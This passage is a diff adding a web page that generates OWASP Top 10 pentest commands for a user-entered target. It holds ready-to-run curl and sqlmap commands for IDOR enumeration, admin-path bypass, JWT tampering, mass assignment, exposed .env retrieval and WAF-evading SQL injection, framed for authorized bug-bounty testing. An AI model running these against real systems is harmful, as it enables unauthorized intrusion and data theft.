@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>awjunaid - OWASP Top 10 Testing Command Suite</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0e13;--s1:#161b22;--s2:#1c2128;
+  --b1:#21262d;--b2:#30363d;
+  --acc:#58a6ff;--grn:#3fb950;--red:#f85149;
+  --ylw:#e3b341;--pur:#d2a8ff;--org:#ffa657;
+  --txt:#e6edf3;--t2:#c9d1d9;--mut:#8b949e;--m2:#6e7681;
+  --mono:'Fira Code','JetBrains Mono',monospace;
+  --r:10px;--rs:6px;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--t2);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:-1;
+  background-image:linear-gradient(rgba(88,166,255,.025) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(88,166,255,.025) 1px,transparent 1px);
+  background-size:44px 44px}
+header{position:sticky;top:0;z-index:9999;background:rgba(10,14,19,.97);backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--b1);padding:.75rem 1.5rem;
+  display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap}
+.hlogo{display:flex;align-items:center;gap:.65rem}
+.hico{width:36px;height:36px;border-radius:8px;flex-shrink:0;
+  background:linear-gradient(135deg,#f851491a,#ffa6571a);border:1px solid #f8514933;
+  display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.hname{font-size:1.1rem;font-weight:800;background:linear-gradient(135deg,#f85149,#ffa657);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hsub{font-size:.65rem;color:var(--mut);margin-top:1px}
+.hbadges{display:flex;gap:.35rem;flex-wrap:wrap}
+.hb{font-size:.65rem;padding:.16rem .5rem;border-radius:2rem;border:1px solid var(--b2);color:var(--mut);background:var(--s1)}
+.hb.g{color:var(--grn);border-color:#3fb95030;background:#3fb95010}
+.hb.b{color:var(--acc);border-color:#58a6ff30;background:#58a6ff10}
+.hb.y{color:var(--ylw);border-color:#e3b34130;background:#e3b34110}
+.hb.r{color:var(--red);border-color:#f8514930;background:#f851490d}
+.hb.p{color:var(--pur);border-color:#d2a8ff30;background:#d2a8ff0d}
+.hb.o{color:var(--org);border-color:#ffa65730;background:#ffa6570d}
+.hero{position:relative;z-index:10;max-width:860px;margin:2.5rem auto 2rem;padding:0 1.2rem;text-align:center}
+.chip{display:inline-flex;align-items:center;gap:.4rem;font-size:.68rem;letter-spacing:1.4px;text-transform:uppercase;
+  color:var(--red);background:#f851490e;border:1px solid #f851492a;padding:.26rem .85rem;border-radius:2rem;margin-bottom:.9rem}
+.hero h2{font-size:2rem;font-weight:800;color:var(--txt);line-height:1.2}
+.grad{background:linear-gradient(135deg,#f85149,#ffa657,#d2a8ff);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero p{color:var(--mut);margin-top:.55rem;font-size:.88rem;max-width:640px;margin-inline:auto;line-height:1.6}
+.panel{margin-top:1.6rem;background:var(--s1);border:1px solid var(--b2);border-radius:14px;
+  padding:1.2rem 1.3rem;box-shadow:0 8px 40px rgba(0,0,0,.45)}
+.irow{display:flex;gap:.45rem;flex-wrap:wrap}
+.ipfx{display:flex;align-items:center;padding:.68rem .85rem;background:var(--s2);
+  border:1px solid var(--b2);border-radius:var(--rs);color:var(--mut);font-family:var(--mono);font-size:.8rem;white-space:nowrap}
+#targetInput{flex:1;min-width:160px;padding:.7rem .95rem;border:1px solid var(--b2);border-radius:var(--rs);
+  background:#0d1117;color:var(--txt);font-size:.93rem;outline:none;font-family:var(--mono);
+  transition:border-color .18s,box-shadow .18s}
+#targetInput:focus{border-color:var(--red);box-shadow:0 0 0 3px #f851491a}
+#targetInput::placeholder{color:var(--m2)}
+#generateBtn{padding:.7rem 1.5rem;border:none;border-radius:var(--rs);
+  background:linear-gradient(135deg,#f85149,#b91c1c);color:#fff;font-size:.88rem;font-weight:700;
+  cursor:pointer;white-space:nowrap;transition:opacity .18s,transform .1s}
+#generateBtn:hover{opacity:.85}
+#generateBtn:active{transform:scale(.97)}
+.errbox{display:none;margin-top:.55rem;background:#f8514910;border:1px solid #f8514930;
+  border-radius:var(--rs);padding:.42rem .65rem;font-size:.78rem;color:var(--red)}
+.statsbar{display:none;gap:1rem;margin-top:.75rem;flex-wrap:wrap}
+.sc{display:flex;align-items:center;gap:.3rem;font-size:.73rem;color:var(--mut)}
+.sc strong{color:var(--txt)}
+.sdot{width:6px;height:6px;border-radius:50%}
+#toolbar{display:none;max-width:1360px;margin:.7rem auto .3rem;padding:0 1.2rem;gap:.4rem;flex-wrap:wrap;align-items:center}
+.vbtn{padding:.3rem .75rem;font-size:.73rem;border:1px solid var(--b1);border-radius:var(--rs);
+  background:var(--s1);color:var(--mut);cursor:pointer;display:flex;align-items:center;gap:.3rem;transition:all .14s}
+.vbtn.on{background:var(--s2);border-color:var(--b2);color:var(--txt)}
+.vbtn:hover{border-color:var(--b2);color:var(--t2)}
+.srch{position:relative;margin-left:auto}
+#searchInput{display:block;width:260px;padding:.4rem .9rem .4rem 2.1rem;background:var(--s2);
+  border:1px solid var(--b2);border-radius:var(--rs);color:var(--txt);font-size:.8rem;
+  font-family:inherit;outline:none;transition:border-color .18s,box-shadow .18s}
+#searchInput:focus{border-color:var(--red);box-shadow:0 0 0 3px #f851491a}
+#searchInput::placeholder{color:var(--m2)}
+.sico{position:absolute;left:.65rem;top:50%;transform:translateY(-50%);color:var(--mut);font-size:.8rem;pointer-events:none}
+#pills{display:none;max-width:1360px;margin:0 auto .55rem;padding:0 1.2rem;gap:.35rem;flex-wrap:wrap}
+.pill{padding:.26rem .72rem;border-radius:2rem;border:1px solid var(--b1);background:var(--s1);
+  color:var(--mut);font-size:.72rem;cursor:pointer;transition:all .14s;user-select:none}
+.pill:hover{border-color:var(--b2);color:var(--t2)}
+.pill.on{background:var(--red);color:#fff;border-color:var(--red);font-weight:700}
+#mainLayout{display:none;max-width:1360px;margin:0 auto 4rem;padding:0 1.2rem;gap:1.1rem;grid-template-columns:215px 1fr}
+@media(max-width:820px){#mainLayout{grid-template-columns:1fr}}
+#sidebar{position:sticky;top:72px;height:fit-content;display:flex;flex-direction:column;gap:.2rem}
+@media(max-width:820px){#sidebar{display:none}}
+.sbt{font-size:.61rem;letter-spacing:1.2px;text-transform:uppercase;color:var(--m2);padding:.3rem .48rem;margin-top:.3rem}
+.sbtn{display:flex;align-items:center;gap:.45rem;padding:.38rem .55rem;border-radius:var(--rs);
+  border:none;background:none;color:var(--mut);font-size:.77rem;cursor:pointer;width:100%;text-align:left;
+  transition:all .14s;border-left:2px solid transparent}
+.sbtn:hover{background:var(--s1);color:var(--t2)}
+.sbtn.on{background:var(--s2);color:var(--red);border-left-color:var(--red)}
+.sbico{font-size:.92rem;width:17px;text-align:center;flex-shrink:0}
+.sblbl{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sbcnt{font-size:.61rem;padding:.06rem .35rem;border-radius:2rem;background:var(--s1);
+  border:1px solid var(--b1);color:var(--m2);flex-shrink:0}
+.sbtn.on .sbcnt{background:#f851491a;border-color:#f8514933;color:var(--red)}
+.sbsep{height:1px;background:var(--b1);margin:.28rem 0}
+#content{position:relative;z-index:1}
+.sec{margin-bottom:1.8rem}
+.sechdr{display:flex;align-items:center;gap:.6rem;margin-bottom:.75rem;padding-bottom:.65rem;border-bottom:1px solid var(--b1)}
+.secico{font-size:1.3rem;flex-shrink:0}
+.sectitle{font-size:.92rem;font-weight:700;color:var(--txt)}
+.secsub{font-size:.72rem;color:var(--mut);margin-top:1px;line-height:1.5}
+.seccnt{margin-left:auto;font-size:.65rem;padding:.15rem .48rem;border-radius:2rem;
+  background:var(--s2);border:1px solid var(--b2);color:var(--mut);white-space:nowrap;flex-shrink:0}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(430px,1fr));gap:.85rem}
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+.card{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);overflow:hidden;
+  display:flex;flex-direction:column;transition:border-color .18s,box-shadow .18s}
+.card:hover{border-color:var(--b2);box-shadow:0 4px 24px rgba(0,0,0,.35)}
+.ch{padding:.85rem 1rem .65rem;border-bottom:1px solid var(--b1);background:linear-gradient(135deg,var(--s2),var(--s1))}
+.ctrow{display:flex;align-items:flex-start;gap:.5rem;margin-bottom:.45rem}
+.cname{font-weight:700;font-size:.9rem;color:var(--txt);flex:1;line-height:1.3}
+.cbadges{display:flex;gap:.28rem;flex-wrap:wrap;flex-shrink:0}
+.bdg{font-size:.59rem;padding:.1rem .44rem;border-radius:2rem;border:1px solid}
+.b-a01{color:#f85149;border-color:#f851492a;background:#f851490a}
+.b-a02{color:#e3b341;border-color:#e3b3412a;background:#e3b3410a}
+.b-a03{color:#ffa657;border-color:#ffa6572a;background:#ffa6570a}
+.b-a04{color:#d2a8ff;border-color:#d2a8ff2a;background:#d2a8ff0a}
+.b-a05{color:#58a6ff;border-color:#58a6ff2a;background:#58a6ff0a}
+.b-a06{color:#3fb950;border-color:#3fb9502a;background:#3fb9500a}
+.b-a07{color:#f778ba;border-color:#f778ba2a;background:#f778ba0a}
+.b-a08{color:#a3e635;border-color:#a3e6352a;background:#a3e6350a}
+.b-a09{color:#79c0ff;border-color:#79c0ff2a;background:#79c0ff0a}
+.b-a10{color:#ff7b72;border-color:#ff7b722a;background:#ff7b720a}
+.rb{font-size:.59rem;padding:.1rem .44rem;border-radius:2rem;border:1px solid;font-weight:700}
+.r-info{color:#58a6ff;border-color:#58a6ff33;background:#58a6ff0d}
+.r-low{color:#3fb950;border-color:#3fb95033;background:#3fb9500d}
+.r-medium{color:#e3b341;border-color:#e3b34133;background:#e3b3410d}
+.r-high{color:#ffa657;border-color:#ffa65733;background:#ffa6570d}
+.r-critical{color:#f85149;border-color:#f8514933;background:#f851490d}
+.what{background:#58a6ff0a;border:1px solid #58a6ff1a;border-radius:var(--rs);
+  padding:.45rem .65rem;font-size:.73rem;color:var(--t2);line-height:1.58;margin-bottom:.4rem}
+.wlbl{font-size:.6rem;letter-spacing:.8px;text-transform:uppercase;color:var(--acc);font-weight:700;margin-bottom:.18rem}
+.whereblock{background:#d2a8ff0a;border:1px solid #d2a8ff1a;border-radius:var(--rs);
+  padding:.45rem .65rem;font-size:.73rem;color:var(--t2);line-height:1.58;margin-bottom:.4rem}
+.wblbl{font-size:.6rem;letter-spacing:.8px;text-transform:uppercase;color:var(--pur);font-weight:700;margin-bottom:.18rem}
+.exploitblock{background:#f851490a;border:1px solid #f851491a;border-radius:var(--rs);
+  padding:.45rem .65rem;font-size:.73rem;color:var(--t2);line-height:1.58;margin-bottom:.4rem}
+.explbl{font-size:.6rem;letter-spacing:.8px;text-transform:uppercase;color:var(--red);font-weight:700;margin-bottom:.18rem}
+.cb{padding:.8rem 1rem;display:flex;flex-direction:column;gap:.6rem}
+.dblk{background:#0d1117;border:1px solid var(--b1);border-radius:var(--rs);overflow:hidden}
+.dbar{display:flex;align-items:center;justify-content:space-between;padding:.28rem .65rem;
+  border-bottom:1px solid var(--b1);background:var(--s1)}
+.dbar-l{display:flex;align-items:center;gap:.45rem}
+.dots{display:flex;gap:3px}
+.dots span{width:8px;height:8px;border-radius:50%}
+.d1{background:#f85149}.d2{background:#e3b341}.d3{background:#3fb950}
+.dbar-r{display:flex;align-items:center;gap:.35rem}
+.cbtn{background:none;border:1px solid var(--b2);color:var(--mut);font-size:.65rem;
+  padding:.13rem .5rem;border-radius:3px;cursor:pointer;transition:all .14s;font-family:var(--mono)}
+.cbtn:hover{border-color:var(--red);color:var(--red)}
+.cbtn.ok{border-color:var(--grn)!important;color:var(--grn)!important}
+.dpre{padding:.65rem .9rem;font-family:var(--mono);font-size:.78rem;color:#a5f3a5;
+  line-height:1.75;white-space:pre-wrap;word-break:break-all;margin:0}
+.dpre .kw{color:#79c0ff;font-weight:700}
+.dpre .fl{color:#ffa657;font-weight:600}
+.dpre .tgt{color:#f85149;font-weight:700}
+.ptog{display:flex;align-items:center;justify-content:space-between;background:var(--s2);
+  border:1px solid var(--b1);border-radius:var(--rs);padding:.34rem .65rem;
+  font-size:.7rem;color:var(--mut);cursor:pointer;transition:all .14s;width:100%;text-align:left}
+.ptog:hover{border-color:var(--b2);color:var(--t2)}
+.ptog .arr{transition:transform .18s;font-size:.58rem;margin-left:auto;padding-left:.5rem}
+.ptog.open .arr{transform:rotate(180deg)}
+.pwrap{display:none;border:1px solid var(--b1);border-top:none;border-radius:0 0 var(--rs) var(--rs);overflow:hidden}
+.pwrap.open{display:block}
+.ptbl{width:100%;border-collapse:collapse;font-size:.7rem}
+.ptbl th{text-align:left;padding:.32rem .58rem;background:var(--bg);color:var(--m2);
+  font-size:.61rem;letter-spacing:.5px;text-transform:uppercase;border-bottom:1px solid var(--b1)}
+.ptbl td{padding:.32rem .58rem;border-bottom:1px solid var(--b1);vertical-align:top}
+.ptbl tr:last-child td{border-bottom:none}
+.ptbl tr:hover td{background:var(--s2)}
+.pf{font-family:var(--mono);color:var(--grn);font-size:.68rem}
+.pd{color:var(--mut);font-size:.68rem}
+.tip{background:#e3b34110;border:1px solid #e3b34128;border-radius:var(--rs);
+  padding:.44rem .65rem;font-size:.71rem;color:#e3b341;display:flex;gap:.42rem;line-height:1.5;align-items:flex-start}
+.wrn{background:#f8514910;border:1px solid #f8514928;border-radius:var(--rs);
+  padding:.44rem .65rem;font-size:.71rem;color:#f85149;display:flex;gap:.42rem;line-height:1.5;align-items:flex-start}
+.ctable{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);overflow:hidden}
+.chdr{display:grid;grid-template-columns:200px 1fr 82px 80px;gap:.4rem;padding:.36rem .75rem;
+  background:var(--s2);border-bottom:1px solid var(--b1);font-size:.62rem;color:var(--m2);
+  letter-spacing:.5px;text-transform:uppercase}
+.crow{display:grid;grid-template-columns:200px 1fr 82px 80px;gap:.4rem;padding:.44rem .75rem;
+  border-bottom:1px solid var(--b1);align-items:center;transition:background .14s}
+.crow:last-child{border-bottom:none}
+.crow:hover{background:var(--s2)}
+.cr-name{font-size:.75rem;font-weight:600;color:var(--txt);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cr-cmd{font-family:var(--mono);font-size:.68rem;color:#a5f3a5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cr-act{display:flex;gap:.28rem;align-items:center}
+.crc{background:none;border:1px solid var(--b2);color:var(--mut);font-size:.62rem;
+  padding:.1rem .38rem;border-radius:3px;cursor:pointer;transition:all .14s}
+.crc:hover{border-color:var(--red);color:var(--red)}
+.crc.ok{border-color:var(--grn)!important;color:var(--grn)!important}
+@media(max-width:640px){.chdr,.crow{grid-template-columns:130px 1fr 70px}}
+.nores{text-align:center;padding:3.5rem;color:var(--mut)}
+.nores h3{font-size:.95rem;color:var(--t2);margin-bottom:.4rem}
+footer{position:relative;z-index:1;border-top:1px solid var(--b1);padding:1.4rem 1.5rem;text-align:center;font-size:.74rem;color:var(--mut)}
+.legal{display:inline-block;background:#f8514910;border:1px solid #f8514928;border-radius:var(--rs);
+  padding:.5rem 1.1rem;max-width:700px;color:#f85149;margin-bottom:.8rem;font-size:.72rem;line-height:1.55}
+footer a{color:var(--acc);text-decoration:none}
+footer a:hover{text-decoration:underline}
+.fbrand{font-weight:800;font-size:.8rem;background:linear-gradient(135deg,#f85149,#ffa657);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="hlogo">
+    <div class="hico">&#128308;</div>
+    <div>
+      <div class="hname">awjunaid</div>
+      <div class="hsub">OWASP Top 10 Testing Command Suite</div>
+    </div>
+  </div>
+  <div class="hbadges">
+    <span class="hb r">&#128027; A01 Broken Access Control</span>
+    <span class="hb y">&#128274; A02 Cryptographic Failures</span>
+    <span class="hb o">&#9889; A03 Injection</span>
+    <span class="hb p">&#127775; A04 Insecure Design</span>
+    <span class="hb b">&#9881; A05 Misconfiguration</span>
+    <span class="hb r">&#9888; Authorized Only</span>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="chip">&#128308; OWASP Top 10 Vulnerability Testing Suite</div>
+  <h2>Enter Target &rarr; Test <span class="grad">OWASP Top 10</span></h2>
+  <p>Complete OWASP Top 10 (2021) testing workflow — for each vulnerability category get: where to look, how to exploit, ready-to-run commands with flags reference. Authorized security research only.</p>
+  <div class="panel">
+    <div class="irow">
+      <div class="ipfx">&#127919; target:</div>
+      <input id="targetInput" type="text" placeholder="example.com or https://example.com" autocomplete="off" spellcheck="false"/>
+      <button id="generateBtn">Generate &#128308;</button>
+    </div>
+    <div class="errbox" id="errbox">&#9888; Please enter a valid domain e.g. <strong>example.com</strong></div>
+    <div class="statsbar" id="statsbar">
+      <div class="sc"><div class="sdot" style="background:var(--acc)"></div>Categories: <strong id="sc1">0</strong></div>
+      <div class="sc"><div class="sdot" style="background:var(--org)"></div>Commands: <strong id="sc2">0</strong></div>
+      <div class="sc"><div class="sdot" style="background:var(--ylw)"></div>Target: <strong id="sc3">-</strong></div>
+    </div>
+  </div>
+</section>
+
+<div id="toolbar">
+  <button class="vbtn on" id="vcard">&#9635; Cards</button>
+  <button class="vbtn" id="vcomp">&#9776; Compact</button>
+  <div class="srch">
+    <span class="sico">&#128269;</span>
+    <input type="text" id="searchInput" placeholder="Search commands, tools, flags..." autocomplete="off" spellcheck="false"/>
+  </div>
+</div>
+<div id="pills"></div>
+<div id="mainLayout">
+  <aside id="sidebar"></aside>
+  <main id="content"></main>
+</div>
+
+<footer>
+  <div class="legal">&#9888; <strong>Legal Disclaimer:</strong> These commands are for <strong>authorized security research and penetration testing only</strong>. Only use on systems you own or have explicit written permission to test. Always operate within the scope defined by your bug bounty program rules of engagement.</div>
+  <br/>
+  <span>Built for ethical hackers and bug bounty hunters &bull; </span>
+  <a href="https://awjunaid.com" target="_blank" rel="noopener">awjunaid.com</a>
+  <br/><br/>
+  <span class="fbrand">awjunaid</span>
+  <span> &mdash; Copyright &copy; 2025 </span>
+  <a href="https://awjunaid.com" target="_blank" rel="noopener">awjunaid.com</a>
+  <span>. All rights reserved.</span>
+</footer>
+
+<script>
+var CATS = [
+  {
+    id:"a01", icon:"&#128027;", badge:"b-a01",
+    title:"A01 — Broken Access Control",
+    desc:"Access control enforces policy such that users cannot act outside their intended permissions. Failures lead to unauthorized information disclosure, modification, or destruction of data.",
+    where:"Look in URL parameters with object IDs (/api/users/123), admin routes accessed without auth (/admin, /dashboard), HTTP method differences (GET vs POST vs DELETE), JWT role claims, and multi-tenant data isolation boundaries. Check every endpoint that accepts a numeric or UUID identifier.",
+    exploit:"Change another user's ID in the URL or API body with your own session token (IDOR). Browse directly to /admin without authentication. Modify the role/isAdmin field in a JWT or request body. Send DELETE/PUT requests to resources you should only be able to GET. Use a low-privilege account to access high-privilege API endpoints.",
+    tip:"IDOR is the most commonly rewarded finding in bug bounty. Always test horizontal privilege escalation (user A accessing user B's data) and vertical privilege escalation (regular user accessing admin functions) separately.",
+    warn:"Never access real user data beyond confirming the vulnerability exists. Create two test accounts and test access between them only. Stop immediately after confirming the issue.",
+    flags:[
+      {f:"-H 'Cookie: session=TOKEN'", d:"Pass session cookie for authenticated requests"},
+      {f:"-X DELETE/PUT/PATCH", d:"Test non-standard HTTP methods on restricted resources"},
+      {f:"--path-as-is", d:"curl: do not normalize the URL path (bypass dot-segment normalization)"},
+      {f:"-b cookies.txt", d:"Use saved cookie jar for session replay"},
+      {f:"-d '{\"role\":\"admin\"}'", d:"Inject role field in POST/PUT body for privilege escalation test"}
+    ],
+    cmds:[
+      {l:"IDOR user ID enumeration", r:"critical",
+       c:"for id in $(seq 1 30); do code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Cookie: session=YOUR_SESSION' 'https://{T}/api/users/'$id); echo \"User $id: HTTP $code\"; done | grep -v 'HTTP 40'",
+       e:"Iterates user object IDs 1–30 using your own session token. A 200 response to IDs other than your own confirms Insecure Direct Object Reference. Replace YOUR_SESSION with a real low-privilege session cookie from a test account. Document every ID returning 200."},
+      {l:"Admin route access without auth", r:"critical",
+       c:"for path in '/admin' '/admin/users' '/dashboard' '/manage' '/control' '/superuser' '/staff' '/internal'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$path); echo \"$path: HTTP $code\"; done | grep -vE 'HTTP (404|301)'",
+       e:"Probes common admin and management paths without any authentication cookie. A 200 response confirms the route is publicly accessible without login. A 403 may still be bypassable with HTTP method switching or header manipulation."},
+      {l:"HTTP method privilege bypass", r:"high",
+       c:"for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do code=$(curl -s -o /dev/null -w '%{http_code}' -X $method -H 'Cookie: session=YOUR_LOW_PRIV_SESSION' 'https://{T}/api/admin/users'); echo \"$method /api/admin/users: HTTP $code\"; done",
+       e:"Tests the same restricted endpoint with all HTTP methods. Applications often enforce authorization only on specific methods. A DELETE or PUT returning 200 when GET returns 403 confirms method-based access control bypass."},
+      {l:"Path traversal access control bypass", r:"high",
+       c:"for bypass in '/admin' '/%2fadmin' '/./admin' '//admin' '/api/../admin' '/public/../admin'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$bypass); echo \"$bypass: HTTP $code\"; done | grep -v 'HTTP 404'",
+       e:"Tests URL encoding and path normalization bypasses to reach restricted admin routes. Web servers and application middleware may handle URL normalization differently creating access control gaps between layers."},
+      {l:"JWT role claim manipulation", r:"critical",
+       c:"TOKEN='YOUR_JWT_TOKEN' && PAYLOAD=$(echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); d['role']='admin'; d['isAdmin']=True; print(json.dumps(d))\") && echo '[+] Modified JWT payload:' && echo $PAYLOAD",
+       e:"Decodes the JWT payload and modifies role claims to admin. After modifying, re-sign the token with the none algorithm or a known weak secret to test whether the server validates the signature. A server accepting a modified unsigned JWT confirms critical authentication bypass."},
+      {l:"Mass assignment IDOR via POST", r:"critical",
+       c:"curl -s -X POST 'https://{T}/api/account/update' -H 'Cookie: session=YOUR_SESSION' -H 'Content-Type: application/json' -d '{\"userId\":2,\"email\":\"hacked@evil.com\",\"role\":\"admin\"}' -w '\nHTTP: %{http_code}'",
+       e:"Sends extra fields like userId and role in a POST request that the application may bind directly to the database model. If the server accepts userId from the client body without validation this is a mass assignment vulnerability allowing account takeover."}
+    ]
+  },
+  {
+    id:"a02", icon:"&#128274;", badge:"b-a02",
+    title:"A02 — Cryptographic Failures",
+    desc:"Formerly Sensitive Data Exposure. Failures in cryptography or its absence lead to exposure of sensitive data including passwords, credit card numbers, health records, and personal information.",
+    where:"Look in HTTPS configuration (check for HTTP downgrade), database fields storing passwords, local storage and cookies for sensitive tokens, API responses returning excessive data, error messages revealing stack traces, and source code/config files exposed on the server. Check TLS version and cipher suite strength.",
+    exploit:"Intercept HTTP traffic to capture credentials transmitted in plaintext. Query endpoints returning full objects with sensitive fields not needed by the client. Read exposed .env or config files containing hardcoded secrets. Crack MD5/SHA1 password hashes from exposed database dumps. Downgrade HTTPS to HTTP via missing HSTS header.",
+    tip:"Always check both HTTP and HTTPS — many apps redirect but leak cookies before the redirect. Look for sensitive data in API responses beyond what the UI displays. Use browser devtools network tab to see full response bodies.",
+    warn:"Do not attempt to decrypt or crack any data beyond what is needed to prove the vulnerability. Never store captured sensitive data. Immediately report any exposed credentials without attempting to use them.",
+    flags:[
+      {f:"--insecure / -k", d:"curl: skip TLS certificate verification"},
+      {f:"-v", d:"curl: verbose mode showing full TLS handshake details"},
+      {f:"--tlsv1.0 / --tlsv1.1", d:"curl: force legacy TLS version to test downgrade"},
+      {f:"--ciphers LIST", d:"curl: force specific cipher suite"},
+      {f:"-c cookies.txt", d:"Save cookies including potentially sensitive session tokens"}
+    ],
+    cmds:[
+      {l:"HTTP to HTTPS redirect check", r:"medium",
+       c:"curl -sI 'http://{T}/' | grep -iE '(location|strict-transport|set-cookie)' && echo '---' && curl -sI 'https://{T}/' | grep -iE '(strict-transport-security)'",
+       e:"Checks whether the plain HTTP version redirects to HTTPS and whether HSTS is set. If cookies are set on the HTTP response before the redirect they are transmitted in plaintext. Missing HSTS allows attackers to downgrade future requests to HTTP via MITM."},
+      {l:"TLS version and cipher audit", r:"medium",
+       c:"nmap --script ssl-enum-ciphers -p 443 {T} 2>/dev/null | grep -E '(TLSv|cipher|WEAK|INSECURE)' | head -30",
+       e:"Enumerates all TLS versions and cipher suites supported by the server. SSLv3, TLS 1.0, and TLS 1.1 are deprecated. RC4, DES, and export-grade ciphers are cryptographically broken. Any WEAK or INSECURE label is a reportable finding."},
+      {l:"Check for exposed sensitive files", r:"critical",
+       c:"for f in '/.env' '/.env.local' '/.env.production' '/config.json' '/appsettings.json' '/database.yml' '/credentials.json' '/secrets.yaml'; do code=$(curl -s -o /dev/null -w '%{http_code}' 'https://{T}'$f); [ \"$code\" = '200' ] && echo \"EXPOSED: $f\" && curl -s 'https://{T}'$f | head -5; done",
+       e:"Checks for configuration and secret files accessible via direct URL. Environment files contain database passwords, API keys, and encryption secrets. A 200 response with key=value content is a critical finding requiring immediate report."},
+      {l:"Cookie security flags check", r:"medium",
+       c:"curl -sI 'https://{T}/login' -X POST -d 'username=test&password=test' | grep -i 'set-cookie' | while read line; do echo $line; echo $line | grep -qi 'secure' || echo '  WARNING: Missing Secure flag'; echo $line | grep -qi 'httponly' || echo '  WARNING: Missing HttpOnly flag'; done",
+       e:"Checks session cookies for Secure and HttpOnly flags. A cookie without Secure can be transmitted over HTTP. A cookie without HttpOnly can be stolen via XSS. Both missing flags on a session cookie is a medium severity cryptographic controls failure."},
+      {l:"Sensitive data in API response", r:"high",
+       c:"curl -s -H 'Cookie: session=YOUR_SESSION' 'https://{T}/api/profile' | python3 -m json.tool | grep -iE '(password|secret|token|key|ssn|card|cvv|pin|hash|salt)'",
+       e:"Fetches the profile API endpoint and checks the full JSON response for sensitive field names. APIs frequently return full database objects including password hashes, internal tokens, and PII that the UI never displays but the client still receives."},
+      {l:"Hash identification from leaked data", r:"info",
+       c:"echo 'Example hash types to identify:' && echo '5f4dcc3b5aa765d61d8327deb882cf99  -> MD5 (password)' && echo '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  -> SHA1 (password)' && echo 'Test with: hashid YOUR_HASH_HERE'",
+       e:"If a database dump or API response contains password hashes use hashid to identify the algorithm. MD5 and SHA1 password hashes without salt are crackable with rainbow tables in seconds. Include the hash type and crackability in your report impact section."},
+      {l:"SSL certificate expiry and info", r:"info",
+       c:"echo | openssl s_client -connect {T}:443 -servername {T} 2>/dev/null | openssl x509 -noout -dates -subject -issuer 2>/dev/null",
+       e:"Retrieves the SSL certificate details including expiry date, subject, and issuer. An expired or self-signed certificate on a production site is a cryptographic failure finding. Certificates expiring within 30 days should be noted in your report."}
+    ]
+  },
+  {
+    id:"a03", icon:"&#9889;", badge:"b-a03",
+    title:"A03 — Injection",
+    desc:"Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query — SQL, OS command, LDAP, NoSQL, XML, and template injection. Attackers can extract, modify, or destroy data.",
+    where:"Look in every input field, URL parameter, HTTP header, cookie value, and JSON/XML body field that is sent to the server. Focus on search boxes, login forms, ID parameters, order/filter fields, username fields, and any parameter that generates a database query or system command. GraphQL queries are often overlooked.",
+    exploit:"Inject SQL syntax like ' OR '1'='1 into login fields to bypass authentication. Use UNION SELECT to extract database schema and data. Inject OS commands via semicolons in ping/nslookup input fields. Use Server-Side Template Injection payloads like {{7*7}} to test template engines. Inject LDAP wildcards (*) in directory search fields.",
+    tip:"Time-based blind injection is the most reliable detection method when error messages are suppressed. A SLEEP(5) delay in the response confirms injection even without visible output. Always test boolean-based blind as a second confirmation.",
+    warn:"Never use sqlmap --dump on production databases. Limit extraction to database version, current user, and current database name for the PoC. Extracting real user data goes beyond what is needed to prove the vulnerability.",
+    flags:[
+      {f:"--batch", d:"sqlmap: non-interactive mode for automated runs"},
+      {f:"--level 3", d:"sqlmap: extended parameter testing including headers"},
+      {f:"--risk 2", d:"sqlmap: include heavier but safe payloads"},
+      {f:"--technique BEUST", d:"sqlmap: Boolean, Error, Union, Stacked, Time-based"},
+      {f:"--tamper=space2comment", d:"sqlmap: bypass WAF keyword filters"},
+      {f:"--dbms=mysql", d:"sqlmap: specify target DBMS to focus payloads"}
+    ],
+    cmds:[
+      {l:"SQLi detection on GET parameter", r:"critical",
+       c:"sqlmap -u 'https://{T}/item?id=1' --batch --level 3 --risk 2 --technique BEUST --banner --current-user --current-db --output-dir=~/pentest/{T}/sqli/ 2>/dev/null",
+       e:"Runs sqlmap against the id GET parameter testing all major injection techniques. The --banner, --current-user, and --current-db flags extract database proof without dumping user data. This output is exactly what you need for a PoC — database type, version, and current user."},
+      {l:"SQLi on POST login form", r:"critical",
+       c:"sqlmap -u 'https://{T}/login' --data 'username=admin&password=test' -p username --batch --level 3 --risk 2 --technique BEUST --tamper=space2comment,between --output-dir=~/pentest/{T}/sqli/ 2>/dev/null",
+       e:"Tests the login username parameter for SQL injection using WAF evasion tamper scripts. A successful injection here means the application is vulnerable to authentication bypass. The space2comment tamper replaces spaces with SQL comments to evade keyword-based WAF rules."},
+      {l:"Time-based blind SQLi manual test", r:"critical",
